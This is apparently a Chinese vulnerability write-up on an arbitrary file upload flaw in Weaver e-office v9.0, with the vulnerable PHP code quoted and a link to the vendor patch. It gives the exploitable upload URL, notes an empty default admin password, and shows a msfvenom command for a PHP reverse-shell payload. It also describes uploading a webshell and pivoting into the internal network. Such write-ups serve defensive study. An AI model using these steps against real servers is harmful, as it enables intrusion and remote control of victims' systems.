**0x00** **写在前面**

 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

# 0x01漏洞描述

泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌,致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。泛微e-office是泛微旗下的一款标准协同移动办公平台。由于 e-office
未能正确处理上传模块中的用户输入，攻击者可以通过该漏洞构造恶意的上传数据包，最终实现任意代码执行。

# 0x02漏洞影响

泛微 e-office v9.0

# 0x04 漏洞分析

问题代码在/general/index/UploadFile.php文件中，具体位置是

if ($uploadType == "eoffice_logo") {

$targetPath = $_SERVER['DOCUMENT_ROOT'] . "/images/logo/";

if (!file_exists($targetPath)) {

mkdir($targetPath, 511, true);

}

$ext = $this->getFileExtension($_FILES['Filedata']['name']);

//将上传的文件尾缀传给变量$ext

$_targetFile = "logo-eoffice" . $ext;

//将上传的文件名改为logo-eoffice.$ext

$targetFile = str_replace("//", "/", $targetPath) . "/" . $_targetFile;

//将['DOCUMENT_ROOT']/images/logo/logo-eoffice.$ext 中的‘//’替换为'/'

if (move_uploaded_file($tempFile, $targetFile)) {

$query = "SELECT * FROM sys_para WHERE PARA_NAME = 'SYS_LOGO'";

$result = exequery($connection, $query);

$row = mysql_fetch_array($result);

$param1 = $param2 = false;

if (!$row) {

$query = "INSERT INTO sys_para VALUES('SYS_LOGO','{$_targetFile}')";

$param1 = exequery($connection, $query);

} else {

$query = "UPDATE sys_para SET PARA_VALUE='{$_targetFile}' WHERE
PARA_NAME='SYS_LOGO'";

$param1 = exequery($connection, $query);

}

//这段代码就是判断文件是否上传成功，如果成功了就更新数据库中的内容

$query = "SELECT * FROM sys_para WHERE PARA_NAME = 'SYS_LOGO_TYPE'";

$result = exequery($connection, $query);

$row = mysql_fetch_array($result);

if (!$row) {

$query = "INSERT INTO sys_para VALUES('SYS_LOGO_TYPE','2')";

$param2 = exequery($connection, $query);

} else {

$query = "UPDATE sys_para SET PARA_VALUE='2' WHERE PARA_NAME='SYS_LOGO_TYPE'";

$param2 = exequery($connection, $query);

}

if ($param1 && $param2) {

echo $_targetFile;

//上传成功后就输出文件名

} else {

echo 0;

}

} else {

echo 0;

}

}

存在漏洞的源代码位置，主要是源于 uploadType 参数设为 eoffice_logo 时，对文件没有校验，导致任意文件上传。

![1649562077_625251dd6da834d7f1aa7.png!small](https://image.3001.net/images/20220410/1649562077_625251dd6da834d7f1aa7.png!small)

# 0x03 漏洞复现

漏洞地址

/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=

漏洞解析地址

/images/logo/logo-eoffice.php

搭建漏洞环境

http://192.168.86.7:8082/login.php

![1649562140_6252521c62f02cb905cbe.png!small](https://image.3001.net/images/20220410/1649562140_6252521c62f02cb905cbe.png!small)

默认用户admin 密码为空。

![1649562154_6252522aa72ca2ce94846.png!small](https://image.3001.net/images/20220410/1649562154_6252522aa72ca2ce94846.png!small)

漏洞利用

使用msfvenom工具生成php文件。

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.86.2 LPORT=12399 R >
yunzui.php

![1649562166_62525236dbc723a0b821a.png!small](https://image.3001.net/images/20220410/1649562166_62525236dbc723a0b821a.png!small)

上传生成的webshell到目标服务器。

测试发现该环境可以解析（php、php3、php4）

测试函数：<?php phpinfo();?>

![1649562179_625252433739b7eb003ba.png!small](https://image.3001.net/images/20220410/1649562179_625252433739b7eb003ba.png!small)

反弹shell上传。

![1649562189_6252524d6984236a6799b.png!small](https://image.3001.net/images/20220410/1649562189_6252524d6984236a6799b.png!small)

设置监听。

![1649562197_62525255d7d1af725c2ce.png!small](https://image.3001.net/images/20220410/1649562197_62525255d7d1af725c2ce.png!small)

解析文件获取反向shell。

![1649562210_62525262c14a89ab60ae5.png!small](https://image.3001.net/images/20220410/1649562210_62525262c14a89ab60ae5.png!small)

内网渗透。

![1649562224_62525270a84918a31d048.png!small](https://image.3001.net/images/20220410/1649562224_62525270a84918a31d048.png!small)

![1649562238_6252527e469b399e4eee6.png!small](https://image.3001.net/images/20220410/1649562238_6252527e469b399e4eee6.png!small)

# 0x04修复建议

厂商已提供漏洞修补方案，建议用户下载使用：

http://v10.e-office.cn/eoffice9update/safepack.zip

